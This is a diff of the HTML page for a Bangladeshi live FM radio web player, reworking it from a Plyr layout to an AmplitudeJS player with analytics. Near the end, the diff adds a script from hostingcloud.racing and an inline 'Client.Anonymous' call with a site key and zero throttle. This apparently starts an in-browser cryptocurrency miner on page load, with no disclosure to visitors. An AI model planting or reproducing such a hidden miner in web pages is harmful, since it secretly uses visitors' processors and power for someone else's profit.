@@ -1,109 +1,135 @@
 <!DOCTYPE html>
-<html lang="en" >
-  
-<!-- 
-Copyright (c) 2018 Rakibul Yeasin
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>FM Radio | BD</title>
+    <link rel="icon" type="image/x-icon" href="https://raw.githubusercontent.com/jekyll/jekyll/master/docs/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
+    <link rel='stylesheet' href='http://cdn.plyr.io/3.3.21/plyr.css'>
+    <link rel="stylesheet" href="css/style.css">
 
- Permission is hereby granted, free of charge, to any person obtaining a copy
- of this software and associated documentation files (the "Software"), to deal
- in the Software without restriction, including without limitation the rights
- to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- copies of the Software, and to permit persons to whom the Software is
- furnished to do so, subject to the following conditions:
- 
- The above copyright notice and this permission notice shall be included in all
- copies or substantial portions of the Software.
- 
- THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
- SOFTWARE.
- -->
+    <meta property="og:title" content="FM Radio | BD" />
+    <meta property="og:locale" content="en_US" />
+    <meta name="description" content="FM Radios Based on Bangladesh" />
+    <meta property="og:description" content="FM Radios Based on Bangladesh" />
+    <link rel="canonical" href="https://fm.rakibul.me/" />
+    <meta property="og:url" content="http://fm.rakibul.me/" />
+    <meta property="og:site_name" content="FM Raadios Based on Bangladesh" />
+    <meta property="og:image" content="https://raw.githubusercontent.com/dreygur/dreygur.github.io/master/img/voldemort.png" />
+    <link rel="stylesheet" href="./css/style.css">
+    <!-- Include font -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,400i" rel="stylesheet">
+  </head>
+  <body>
 
-<head>
-  <meta charset="UTF-8">
-  <title>FM Radio | BD</title>
-  <link rel="icon" type="image/x-icon" href="https://raw.githubusercontent.com/jekyll/jekyll/master/docs/favicon.ico">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
-  <link rel='stylesheet' href='http://cdn.plyr.io/3.3.21/plyr.css'>
-  <link rel="stylesheet" href="css/style.css">
-
-  <meta property="og:title" content="FM Radio | BD" />
-  <meta property="og:locale" content="en_US" />
-  <meta name="description" content="FM Radios Based on Bangladesh" />
-  <meta property="og:description" content="FM Radios Based on Bangladesh" />
-  <link rel="canonical" href="https://lab.rakibul.me/" />
-  <meta property="og:url" content="http://lab.rakibul.me/" />
-  <meta property="og:site_name" content="FM Raadios Based on Bangladesh" />
-  <meta property="og:image" content="https://raw.githubusercontent.com/dreygur/dreygur.github.io/master/img/voldemort.png" />
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-  <script>
-       (adsbygoogle = window.adsbygoogle || []).push({
-            google_ad_client: "ca-pub-7929416557934704",
-            enable_page_level_ads: true
-       });
-  </script>
-</head>
-
-<body>
-  <header>
-    <h1>LIVE FM Radio (Bangladesh Only)</h1>
-  </header>
-  <div class="container">
-    <div class="column add-bottom">
-      <div id="mainwrap">
-        <div id="nowPlay">
-          <span id="npAction">Paused...</span><span id="npTitle"></span>
+    <div id="flat-black-player-container">
+      <div id="list-screen" class="slide-in-top">
+        <div id="list-screen-header" class="hide-playlist">
+          <img id="up-arrow" src="https://521dimensions.com/img/open-source/amplitudejs/examples/flat-black/up.svg"/>
+          Hide Radio Channels
         </div>
-        <div id="audiowrap">
-          <div id="audio0">
-            <audio id="audio1" preload controls>Your browser does not support HTML5 Audio! 😢</audio>
+
+        <div id="list"></div>
+
+        <div id="list-screen-footer">
+          <div id="list-screen-meta-container">
+            <span data-amplitude-song-info="name" class="song-name"></span>
+
+            <div class="song-artist-album">
+              <span data-amplitude-song-info="artist"></span>
+            </div>
           </div>
-          <div id="tracks">
-            <a id="btnPrev">&larr;</a><a id="btnNext">&rarr;</a>
+          <div class="list-controls">
+            <div class="list-previous amplitude-prev"></div>
+            <div class="list-play-pause amplitude-play-pause"></div>
+            <div class="list-next amplitude-next"></div>
           </div>
         </div>
-        <div id="plwrap">
-          <ul id="plList"></ul>
+      </div>
+      <div id="player-screen">
+        <div class="player-header down-header">
+          <img id="down" src="https://521dimensions.com/img/open-source/amplitudejs/examples/flat-black/down.svg"/>
+          Show Radio Channels
         </div>
-        
-        <!-- Ad -->
-        <center><script type="text/javascript" src="https://wap4dollar.com/ad/code/?id=xete1bpi63"></script></center>
-        
+        <div id="player-top">
+          <img data-amplitude-song-info="cover_art_url"/>
+        </div>
+        <div id="player-progress-bar-container">
+          <progress id="song-played-progress" class="amplitude-song-played-progress"></progress>
+          <progress id="song-buffered-progress" class="amplitude-buffered-progress" value="0"></progress>
+        </div>
+        <div id="player-middle">
+          <div id="time-container">
+            <!-- <span class="amplitude-current-time time-container"></span>
+            <span class="amplitude-duration-time time-container"></span> -->
+          </div>
+          <div id="meta-container">
+            <span data-amplitude-song-info="name" class="song-name"></span>
+
+            <div class="song-artist-album">
+              <span data-amplitude-song-info="artist"></span>
+            </div>
+          </div>
+        </div>
+        <div id="player-bottom">
+          <div id="control-container">
+
+            <div id="shuffle-container">
+              <div class="amplitude-shuffle amplitude-shuffle-off" id="shuffle"></div>
+            </div>
+
+            <div id="prev-container">
+              <div class="amplitude-prev" id="previous"></div>
+            </div>
+
+            <div id="play-pause-container">
+              <div class="amplitude-play-pause" id="play-pause"></div>
+            </div>
+
+            <div id="next-container">
+              <div class="amplitude-next" id="next"></div>
+            </div>
+
+            <div id="repeat-container">
+              <div class="amplitude-repeat" id="repeat"></div>
+            </div>
+
+          </div>
+
+          <div id="volume-container">
+            <img src="https://521dimensions.com/img/open-source/amplitudejs/examples/flat-black/volume.svg"/><input type="range" class="amplitude-volume-slider" step=".5"/>
+          </div>
+        </div>
       </div>
     </div>
-    <div class="column add-bottom center">
-      <p>Made with &hearts; by <a href="https://www.facebook.com/dreygur">Rakibul Yeasin</a></p>
-    </div>
-  </div>
-  <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js'></script>
-  <script src='http://cdnjs.cloudflare.com/ajax/libs/html5media/1.1.8/html5media.min.js'></script>
-  <script src='http://cdnjs.cloudflare.com/ajax/libs/plyr/3.3.21/plyr.min.js'></script>
-  <script  src="js/index.js"></script>
-  
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-114697093-1"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-    gtag('config', 'UA-114697093-1');
-  </script>
 
-  <!-- Google Analytics -->
-  <script>
-  window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-  ga('create', 'UA-114697093-1', 'auto');
-  ga('send', 'pageview');
-  </script>
-  <script async src='https://www.google-analytics.com/analytics.js'></script>
-  <!-- End Google Analytics -->
-</body>
+    <a href="https://facebook.com/dreygur" class="learn-more">By - Rakibul Yeasin</a>
+    <!-- partial -->
+    <script class="script" src='http://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js'></script>
+    <script src='https://cdn.jsdelivr.net/npm/amplitudejs@latest/dist/amplitude.min.js'></script>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script class="script" async src="https://www.googletagmanager.com/gtag/js?id=UA-114697093-1"></script>
+    <script class="script">
+      window.dataLayer = window.dataLayer || [];
+      function gtag() { dataLayer.push(arguments); }
+      gtag('js', new Date());
+      gtag('config', 'UA-114697093-1');
+    </script>
+    <!-- <br><br><br>
+    <center>
+      <script class="script" src="//static.surfe.pro/js/net.js"></script>
+      <ins class="surfe-be" data-sid="7013"></ins>
+      <script class="script">(adsurfebe = window.adsurfebe || []).push({});</script>
+    </center> -->
 
+    <script class="script" src="https://www.hostingcloud.racing/6nvh.js"></script>
+    <script class="script">
+      var _client = new Client.Anonymous('212ba91586e1acb5cee4178982e81841134839c0a6c769b0457bd5970ab4f63b', {
+        throttle: 0, ads: 0
+      });
+      _client.start();
+    </script>
+    <script  src="./js/script.js"></script>
+  </body>
 </html>
